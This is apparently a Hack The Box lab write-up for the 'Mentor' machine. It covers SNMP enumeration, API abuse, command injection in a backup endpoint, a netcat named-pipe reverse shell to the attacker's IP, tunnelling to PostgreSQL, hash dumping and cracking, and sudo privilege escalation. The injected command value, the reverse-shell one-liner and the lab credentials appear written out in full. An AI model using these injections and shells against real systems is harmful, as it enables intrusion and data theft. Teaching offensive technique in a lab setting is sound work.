---
title: "Mentor"
published: 2026-06-12
draft: false
description: 'Linux Medium machine - Mentor.'
series: 'Hack-The-Box'
tags: ['HTB', 'Linux', 'Sudo', 'PHP', 'SSH', 'SNMP', 'DNS', 'PostgreSQL']
difficulty: 'Medium'
osType: 'Linux'
---


- Machine Name: Mentor
- OS Type: Linux
- Difficulty: Medium

### Port Scanning - Service & Version Enumeration

```csharp
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=
|   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port Scanning - UDP services

```php
PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 3h24m48s
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 3h24m48.40s (1228840 timeticks)
Service Info: Host: mentor
```

## Enumeration

### Port 161/SNMP (UDP)

port 161 is open and running SNMP v1 let’s use snmpwalk to find any useful information

```php
snmpwalk -v 1 -c public 10.10.11.193
```

```php
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (1188808) 3:18:08.08
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (1191322) 3:18:33.22
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 04 1E 0F 0C 2C 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 229
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

there’s some interesting words like - mentor, admin@mentorquotes.htb, “Sitting on the dock of the bay”

### Port 80/HTTP

move to another port 80, let’s visit the website in browser

![image.png](image.png)

it’s looks like the website is configured to allow access from hostname (URL) only let’s edit the /etc/hosts file and then enter the entry for mentorquotes.htb

![image.png](image-1.png)

let’s check the web technologies via whatweb

```csharp
whatweb http://mentorquotes.htb/
```

![image.png](image-2.png)

i checked for hidden files and directories but didn’t find anything useful let’s try subdomains

```csharp
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.193 -H "Host: FUZZ.mentorquotes.htb" --hl 9
```

![image.png](image-3.png)

let’s add the api subdomain to our /etc/hosts file

![image.png](image-4.png)

let’s visit the api.mentorquotes.htb

![image.png](image-5.png)

let’s run the gobuster to find endpoint for the API server

```csharp
gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
```

![image.png](image-6.png)

let’s check the /docs folder

![image.png](image-7.png)

looks like the API definations, then i tried to access the /users api but it needs authentication token which we can get from the following steps:

1. create a user account via /auth/signup api

![image.png](image-8.png)

1. login using /auth/login api

![image.png](image-9.png)

let’s use this token to pass in the /users api

![image.png](image-10.png)

nothing interesting from here, so i’ve decided to find other community strings other than public, i tried using hydra but it only able to detect public, changing the tool i found https://github.com/SECFORCE/SNMP-Brute/ 

```php
python3 snmpbrute.py -t 10.10.11.193 -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

![image.png](image-11.png)

we found version **2c** and community string **internal**

```php
snmpwalk -v 2c -c internal 10.10.11.193
```

![image.png](image-12.png)

looks like the password for something. and looks like we found the username possible username - james and email from the /openapi.json

![image.png](image-13.png)

let’s try to login with this pieces of puzzle

```php
curl -X 'POST' \
  'http://api.mentorquotes.htb/auth/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}'
```

![image.png](image-14.png)

and we got the success, let’s enumerate users using /users api 

![image.png](image-15.png)

but it doesn’t disclosed the password or any useful information let’s check the /admin endpoint that we’ve found during our gobuster scan

![image.png](image-16.png)

let’s check the /admin/check endpoint first

![image.png](image-17.png)

nothing interesting, moving to /admin/backup

![image.png](image-18.png)

it shows the path parameter is required

let’s pass the /etc/passwd file here

![image.png](image-19.png)

assuming it takes input from parameter and run command like zip or tar let’s check if it is passing parameter value without any sanitization, to check that i simply using `;` semicolon to terminate 1st command and execute another command, as this is not showing any command output, we need to play this blind, like we can use curl, ping or sleep commands as usual i’m using ping command

start the tcpdump to intercept the ICMP requests on tun0

```php
sudo tcpdump -i tun0 icmp -v
```

and then run below curl command 

```php
curl -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Content-Type: application/json" -d '{"path":"_x0h3x; ping -c 1 10.10.14.17;"}'
```

![image.png](image-20.png)

😈 when the ICMP says hello from different machine it gives me kick~!

### It’s Time for Shell $

so i’ll use the busybox with nc to get shell fast, BUT the busybox command was not working as expected so i used the named pipe shell

```php
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.17 443 > /tmp/f
```

![image.png](image-21.png)

looks like we have a shell inside the container

![image.png](image-22.png)

we can get user.txt from /home/svc/user.txt

![image.png](image-23.png)

let’s use the chisel to forward port to our kali machine as psql is not installed on container

so i downloaded the chisel https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz and then transfer it to target machine via wget and python http server

now if we look at the [db.py](http://db.py) we found that the database IP is different then current machine ip 

![image.png](image-24.png)

possibly it’s different container so we need to specify this IP in chisel command so let’s start chisel server on kali

```csharp
chisel server --reverse --port 5000
```

on target machine

```bash
./chisel client 10.10.14.17:5000 R:172.22.0.1:5432
```

we used `172.22.0.1` → the ip address of database

![image.png](image-25.png)

now it will forward all request that we send to [localhost](http://localhost) on port 5432 it will forwarded to database server

now let’s connect to database using psql

```bash
psql -h 127.0.0.1 -p 5432 -U postgres -W -d mentorquotes_db
```

to list the tables and sequences in database we’ll use the `\d` command to list only tables we’ll use `\dt` 

![image.png](image-26.png)

the users table looks interesting to me let’s use select query to extract the data from it

```bash
select * from users;
```

![image.png](image-27.png)

if you know the python you can do it without forwarding port

```bash
python3 -c "import psycopg2; conn=psycopg2.connect('host=172.22.0.1 dbname=mentorquotes_db user=postgres password=postgres'); cur=conn.cursor(); cur.execute('SELECT * FROM users'); print(cur.fetchall()); conn.close()"
```

![image.png](image-28.png)

```php
[(1, 'james@mentorquotes.htb', 'james', '7ccdcd8c05b59add9c198d492b36a503'), (2, 'svc@mentorquotes.htb', 'service_acc', '53f22d0dfa10dce7e29cd31f4f953fd8')]
```

crack password using crackstation.net

![image.png](image-29.png)

password for svc user → 123meunomeeivani

![image.png](image-30.png)

let’s login using ssh

```php
ssh svc@10.10.11.193
```

![image.png](image-31.png)

there’s another user on the system `james` 

![image.png](image-32.png)

linpeas revelas hardcoded password in snmp conf file

![image.png](image-33.png)

let’s use this password to su to james

![image.png](image-34.png)

Bingo! we are logged in as james

let’s check if we can run any command using sudo as james

```bash
sudo -l
```

![image.png](image-35.png)

hahaha it give us ability to run shell `/bin/sh` as root!

![image.png](image-36.png)